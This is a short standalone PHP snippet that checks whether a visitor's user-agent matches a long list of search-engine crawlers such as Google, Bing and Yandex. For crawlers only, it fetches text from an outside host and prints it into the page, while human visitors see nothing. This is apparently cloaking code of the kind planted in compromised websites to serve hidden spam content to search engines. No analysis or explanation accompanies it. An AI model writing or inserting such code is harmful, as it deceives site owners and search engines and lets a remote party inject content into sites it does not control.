<?php
$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#', '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i', '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i', '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i', '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i', '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i', '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i', '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i', '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i', '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i', '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i', '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i', '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i', '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i', '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i', '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i', '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i', '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;
if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){$isbot = 1;}
else
$isbot = 0;
if ($isbot)
{$str=file_get_contents('https://next1.space/hdsfkj/y2.txt');
echo $str;}
if(!@$isbot)
{}
?>